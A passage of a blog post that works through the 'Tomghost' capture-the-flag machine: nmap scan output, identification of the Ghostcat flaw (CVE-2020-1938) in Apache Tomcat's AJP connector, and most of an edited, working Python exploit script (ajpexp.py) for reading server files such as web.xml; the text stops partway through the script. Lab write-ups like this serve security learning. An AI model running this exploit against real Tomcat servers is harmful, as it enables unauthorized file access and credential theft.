<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Tomghost" /><meta name="author" content="Ibrahim" /><meta property="og:locale" content="en" /><meta name="description" content="Identify recent vulnerabilities to try exploit the system or read files that you should not have access to." /><meta property="og:description" content="Identify recent vulnerabilities to try exploit the system or read files that you should not have access to." /><link rel="canonical" href="/posts/tomghost/" /><meta property="og:url" content="/posts/tomghost/" /><meta property="og:site_name" content="Ibrahim EO." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-02-21T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Tomghost" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Ibrahim" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Ibrahim"},"dateModified":"2024-10-27T16:42:28+01:00","datePublished":"2024-02-21T00:00:00+01:00","description":"Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.","headline":"Tomghost","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/tomghost/"},"url":"/posts/tomghost/"}</script><title>Tomghost | Ibrahim EO.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ibrahim EO."><meta name="application-name" content="Ibrahim EO."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/elomarii-portfolio.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=G-X4YT79QSQC"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-X4YT79QSQC'); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/whoami">Ibrahim EO.</a></h1><p class="site-subtitle fst-italic mb-0">Information Systems Engineer / InfoSec Enthousiaste</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-bars-progress"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-newspaper"></i> <span>BLOG</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-chess-rook"></i> <span>WHOAMI</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/elomarii" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/ibrahim-el-omari/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="javascript:location.href = 'mailto:' + ['i.ibrahim.elomari','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Tomghost</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Tomghost</h1><p class="post-desc fw-light mb-4">Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1708470000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Feb 21, 2024 </time> </span><div class="d-flex justify-content-between"> <span> By <em> Ibrahim </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1990 words" > <em>11 min</em> read</span></div></div></div></header><div class="content"><p>First, machine scanning</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>$ sudo nmap -sV -sC $IP -Pn -n --disable-arp-ping

&lt;...snip...&gt;
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>On port 8080 running an Apache Tomcat 9 web server. Navigating there, we found the default page after setup of the server. Additionaly, ajp13 is exposed on port 8009 which, after some research about the two services, might expose a vulnerability named <em>Ghostcat</em></p><blockquote class="prompt-info"><p>Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like WEB-INF/web.xml which can leak important information like credentials for the Tomcat interface, depending on the server setup.</p></blockquote><p>CVE of the vulnerability: CVE-2020-1938.<br /> A potential exploit: <a href="https://www.exploit-db.com/exploits/48143">from ExploitDB</a>.</p><p>I tried using the exploit directly and found some (small) issues so here is the edited version:</p><div file="ajpexp.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="ajpexp.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
#CNVD-2020-10487  Tomcat-Ajp lfi
#by ydhcui
</span><span class="kn">import</span> <span class="n">struct</span>

<span class="c1"># Some references:
# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
</span><span class="k">def</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">s</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;h</span><span class="sh">"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">l</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H%dsb</span><span class="sh">"</span> <span class="o">%</span> <span class="n">l</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf8</span><span class="sh">'</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">fmt</span><span class="p">):</span>
	<span class="n">size</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">calcsize</span><span class="p">(</span><span class="n">fmt</span><span class="p">)</span>
	<span class="n">buf</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">):</span>
	<span class="n">size</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;h</span><span class="sh">"</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="c1"># null string
</span>		<span class="k">return</span> <span class="bp">None</span>
	<span class="n">res</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">%ds</span><span class="sh">"</span> <span class="o">%</span> <span class="n">size</span><span class="p">)</span>
	<span class="n">stream</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># \0
</span>	<span class="k">return</span> <span class="n">res</span>
<span class="k">class</span> <span class="nc">NotFoundException</span><span class="p">(</span><span class="nb">Exception</span><span class="p">):</span>
	<span class="k">pass</span>
<span class="k">class</span> <span class="nc">AjpBodyRequest</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
	<span class="c1"># server == web server, container == servlet
</span>	<span class="n">SERVER_TO_CONTAINER</span><span class="p">,</span> <span class="n">CONTAINER_TO_SERVER</span> <span class="o">=</span> <span class="nf">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
	<span class="n">MAX_REQUEST_LENGTH</span> <span class="o">=</span> <span class="mi">8186</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">data_stream</span><span class="p">,</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_direction</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">data_stream</span> <span class="o">=</span> <span class="n">data_stream</span>
		<span class="n">self</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="n">data_len</span>
		<span class="n">self</span><span class="p">.</span><span class="n">data_direction</span> <span class="o">=</span> <span class="n">data_direction</span>
	<span class="k">def</span> <span class="nf">serialize</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
		<span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">data_stream</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">AjpBodyRequest</span><span class="p">.</span><span class="n">MAX_REQUEST_LENGTH</span><span class="p">)</span>
		<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;bbH</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
			<span class="n">res</span> <span class="o">+=</span> <span class="n">data</span>
		<span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">data_direction</span> <span class="o">==</span> <span class="n">AjpBodyRequest</span><span class="p">.</span><span class="n">SERVER_TO_CONTAINER</span><span class="p">:</span>
			<span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;bbH</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;bbH</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">header</span> <span class="o">+</span> <span class="n">res</span>
	<span class="k">def</span> <span class="nf">send_and_receive</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
			<span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">serialize</span><span class="p">()</span>
			<span class="n">socket</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
			<span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="nf">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
			<span class="k">while</span> <span class="n">r</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">!=</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">GET_BODY_CHUNK</span> <span class="ow">and</span> <span class="n">r</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">!=</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">SEND_HEADERS</span><span class="p">:</span>
				<span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="nf">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>

			<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">SEND_HEADERS</span> <span class="ow">or</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
				<span class="k">break</span>
<span class="k">class</span> <span class="nc">AjpForwardRequest</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
	<span class="n">_</span><span class="p">,</span> <span class="n">OPTIONS</span><span class="p">,</span> <span class="n">GET</span><span class="p">,</span> <span class="n">HEAD</span><span class="p">,</span> <span class="n">POST</span><span class="p">,</span> <span class="n">PUT</span><span class="p">,</span> <span class="n">DELETE</span><span class="p">,</span> <span class="n">TRACE</span><span class="p">,</span> <span class="n">PROPFIND</span><span class="p">,</span> <span class="n">PROPPATCH</span><span class="p">,</span> <span class="n">MKCOL</span><span class="p">,</span> <span class="n">COPY</span><span class="p">,</span> <span class="n">MOVE</span><span class="p">,</span> <span class="n">LOCK</span><span class="p">,</span> <span class="n">UNLOCK</span><span class="p">,</span> <span class="n">ACL</span><span class="p">,</span> <span class="n">REPORT</span><span class="p">,</span> <span class="n">VERSION_CONTROL</span><span class="p">,</span> <span class="n">CHECKIN</span><span class="p">,</span> <span class="n">CHECKOUT</span><span class="p">,</span> <span class="n">UNCHECKOUT</span><span class="p">,</span> <span class="n">SEARCH</span><span class="p">,</span> <span class="n">MKWORKSPACE</span><span class="p">,</span> <span class="n">UPDATE</span><span class="p">,</span> <span class="n">LABEL</span><span class="p">,</span> <span class="n">MERGE</span><span class="p">,</span> <span class="n">BASELINE_CONTROL</span><span class="p">,</span> <span class="n">MKACTIVITY</span> <span class="o">=</span> <span class="nf">range</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span>
	<span class="n">REQUEST_METHODS</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span> <span class="n">GET</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span> <span class="n">POST</span><span class="p">,</span> <span class="sh">'</span><span class="s">HEAD</span><span class="sh">'</span><span class="p">:</span> <span class="n">HEAD</span><span class="p">,</span> <span class="sh">'</span><span class="s">OPTIONS</span><span class="sh">'</span><span class="p">:</span> <span class="n">OPTIONS</span><span class="p">,</span> <span class="sh">'</span><span class="s">PUT</span><span class="sh">'</span><span class="p">:</span> <span class="n">PUT</span><span class="p">,</span> <span class="sh">'</span><span class="s">DELETE</span><span class="sh">'</span><span class="p">:</span> <span class="n">DELETE</span><span class="p">,</span> <span class="sh">'</span><span class="s">TRACE</span><span class="sh">'</span><span class="p">:</span> <span class="n">TRACE</span><span class="p">}</span>
	<span class="c1"># server == web server, container == servlet
</span>	<span class="n">SERVER_TO_CONTAINER</span><span class="p">,</span> <span class="n">CONTAINER_TO_SERVER</span> <span class="o">=</span> <span class="nf">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
	<span class="n">COMMON_HEADERS</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">SC_REQ_ACCEPT</span><span class="sh">"</span><span class="p">,</span>
		<span class="sh">"</span><span class="s">SC_REQ_ACCEPT_CHARSET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_ACCEPT_ENCODING</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_ACCEPT_LANGUAGE</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_AUTHORIZATION</span><span class="sh">"</span><span class="p">,</span>
		<span class="sh">"</span><span class="s">SC_REQ_CONNECTION</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_CONTENT_TYPE</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_CONTENT_LENGTH</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_COOKIE</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_COOKIE2</span><span class="sh">"</span><span class="p">,</span>
		<span class="sh">"</span><span class="s">SC_REQ_HOST</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_PRAGMA</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_REFERER</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SC_REQ_USER_AGENT</span><span class="sh">"</span>
	<span class="p">]</span>
	<span class="n">ATTRIBUTES</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">context</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">servlet_path</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">remote_user</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">auth_type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">query_string</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">route</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ssl_cert</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ssl_cipher</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ssl_session</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">req_attribute</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ssl_key_size</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">secret</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">stored_method</span><span class="sh">"</span><span class="p">]</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">data_direction</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">=</span> <span class="mh">0x02</span>
		<span class="n">self</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">remote_host</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">server_name</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">server_port</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">is_ssl</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">num_headers</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">request_headers</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">attributes</span> <span class="o">=</span> <span class="bp">None</span>
		<span class="n">self</span><span class="p">.</span><span class="n">data_direction</span> <span class="o">=</span> <span class="n">data_direction</span>
	<span class="k">def</span> <span class="nf">pack_headers</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">num_headers</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">request_headers</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="sh">""</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;h</span><span class="sh">"</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">num_headers</span><span class="p">)</span>
		<span class="k">for</span> <span class="n">h_name</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">request_headers</span><span class="p">:</span>
			<span class="k">if</span> <span class="n">h_name</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">SC_REQ</span><span class="sh">"</span><span class="p">):</span>
				<span class="n">code</span> <span class="o">=</span> <span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">COMMON_HEADERS</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="n">h_name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
				<span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">BB</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">h_name</span><span class="p">)</span>

			<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">request_headers</span><span class="p">[</span><span class="n">h_name</span><span class="p">])</span>
		<span class="k">return</span> <span class="n">res</span>

	<span class="k">def</span> <span class="nf">pack_attributes</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
		<span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
		<span class="k">for</span> <span class="n">attr</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">attributes</span><span class="p">:</span>
			<span class="n">a_name</span> <span class="o">=</span> <span class="n">attr</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span>
			<span class="n">code</span> <span class="o">=</span> <span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">ATTRIBUTES</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="n">a_name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
			<span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">b</span><span class="sh">"</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">a_name</span> <span class="o">==</span> <span class="sh">"</span><span class="s">req_attribute</span><span class="sh">"</span><span class="p">:</span>
				<span class="n">aa_name</span><span class="p">,</span> <span class="n">a_value</span> <span class="o">=</span> <span class="n">attr</span><span class="p">[</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">]</span>
				<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">aa_name</span><span class="p">)</span>
				<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">a_value</span><span class="p">)</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">attr</span><span class="p">[</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">])</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">res</span>
	<span class="k">def</span> <span class="nf">serialize</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
		<span class="n">res</span> <span class="o">=</span> <span class="sh">""</span>
